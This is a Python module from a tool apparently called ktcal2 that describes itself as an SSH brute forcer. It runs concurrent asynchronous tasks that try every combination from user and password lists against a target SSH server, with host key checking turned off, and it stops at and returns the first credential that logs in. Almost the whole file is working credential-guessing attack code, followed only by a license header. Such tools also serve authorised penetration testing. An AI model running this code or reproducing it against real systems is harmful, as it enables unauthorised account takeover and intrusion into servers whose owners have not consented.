# -*- coding: utf-8 -*-

"""
ktcal2: This file contains function for SSH brute forcer.
"""

import asyncio
import asyncssh
import itertools

from .data import FoundCredential


__license__ = '''Copyright (c) cr0hn - cr0hn<-at->cr0hn.com (@ggdaniel) All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright
       notice, this list of conditions and the following disclaimer in the
       documentation and/or other materials provided with the distribution.

    3. Neither the name of cr0hn nor the names of its contributors may be used
       to endorse or promote products derived from this software without
       specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.'''

__author__ = 'cr0hn - cr0hn<-at->cr0hn.com (@ggdaniel)'


loop = None
result_user = None
result_password = None
counter = 1


@asyncio.coroutine
def _check_credentials(target, credentials, delay, port=22, display_func=None,
                       verbosity_level=0):
    """
    Check a concrete credential.
    
    :param target: target with SSH service running
    :type target: str

    :param credentials: Generator as format: (user, password)
    :type credentials: generator

    :param port: target port
    :type port: int
    """
    
    while 1:
        try:
            global counter
            
            try:
                user, password = next(itertools.islice(credentials, counter, counter + 1))
            except StopIteration:
                break
            counter += 1
            
            if user is None or password is None:
                break
            
            if display_func is not None:
                if verbosity_level > 1:
                    msg = "\r [*] Testing... %s credentials (%s:%s)%s" % (counter, user, password, " " * 4)
                    display_func(msg)
                else:
                    msg = "\r [*] Testing... %s credentials%s" % (counter, " " * 4)
                    if counter % 4 == 0:
                        display_func(msg)
            
            conn, client = yield from asyncssh.create_connection(None,
                                                                 host=target,
                                                                 port=port,
                                                                 username=user,
                                                                 password=password,
                                                                 server_host_keys=None)
            
            # If not raise exception -> user/password found
            global result_password, result_user, loop
            result_user = user
            result_password = password
            
            loop.stop()
        except (asyncssh.misc.DisconnectError, ConnectionResetError) as e:
            yield from asyncio.sleep(delay)


# ----------------------------------------------------------------------
def ssh_check(params):
    """
    Try to find SSH credentials.
    
    :param params: GlobalParameters object 
    :type params: :class:`lib.data.GlobalParameters`
    
    :return: First valid credential in FoundCredential object
    :rtype: :class:`lib.data.FoundCredential`

    :raises: ConnectionError, ConnectionRefusedError
    """
    global loop
    
    try:
        # Prepare event loop and create tasks
        loop = asyncio.get_event_loop()
        
        concurrency = int(params.concurrency)
        user_list = params.user_list
        password_list = params.password_list
        target = params.target
        port = params.port
        delay = params.delay
        display_func = params.display_function
        verbosity = params.verbosity
        
        auth = ((user, password) for user in user_list for password in password_list)

        futures = [loop.create_task(_check_credentials(target,
                                                       auth,
                                                       delay,
                                                       port,
                                                       display_func,
                                                       verbosity))
                   for x in range(concurrency)]
        
        try:
            loop.run_until_complete(asyncio.wait(futures))

            # Password found?
            if result_user is not None and result_password is not None:
                credential = FoundCredential(user=result_user, password=result_password)
            else:
                credential = None

            return credential
        
        except KeyboardInterrupt:
            # Stopping
            display_func("\n [*] Stopping...")
            for x in futures:
                x.cancel()
            
            loop.run_until_complete(asyncio.wait(futures))
        
    except (OSError, asyncssh.Error) as exc:
        raise ConnectionError('SSH connection failed: ', str(exc))
    except ConnectionRefusedError:
        raise ConnectionRefusedError("Can't connect with remote host. Check IP and port")
